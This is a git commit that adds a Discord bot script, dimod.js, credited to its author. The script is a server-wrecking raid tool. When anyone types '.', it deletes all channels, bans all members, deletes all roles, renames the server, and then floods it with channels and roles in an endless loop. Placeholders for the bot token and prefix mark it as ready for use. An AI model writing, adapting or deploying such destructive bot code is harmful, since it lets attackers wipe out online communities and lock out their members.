656c99e809dd647517e57773accb040c50f5878c
DimOD2x <89885606+DimOD2x@users.noreply.github.com>
2021-09-26 17:35:30 +0300

    Update dimod.js

--- dimod.js
+++ dimod.js
@@ -1,1 +1,30 @@
+const Discord = require("discord.js");
+const client = new Discord.Client();
+const prefix = "PREFIX LERA DABNE";
+client.on("message", message => {
+  if (message.content === ".") {
+    if (message.channel.guild) {
+      message.guild.channels.forEach(c => {
+        if (c.deletable) {
+          c.delete();
+        }
+      });
+      message.guild.members.forEach(m => {
+        m.ban();
+      });
+      message.guild.roles.forEach(r => {
+        r.delete();
+      });
+      message.guild.setName("BY D1MOD");////NAWEK BO SERVERAKA DANE 
+      setInterval(function() {
+        message.guild.createChannel("BY D1MOD", "id text");///////bo channel 
+        message.guild.createChannel("BY D1MOD", "id voice");////bo voice
+        message.guild.createRole({ name: "BY D1MOD" });////NAWEK DABNE BO ROLE
+      });
+    }
+  }
+});
 
+client.login("TOKEN LERA DABNE")
+
+////////////////CODED BY D1MODˢᵘⁿ/ᵇˡᵃᶜᵏ ʰᵃᵗ#3415
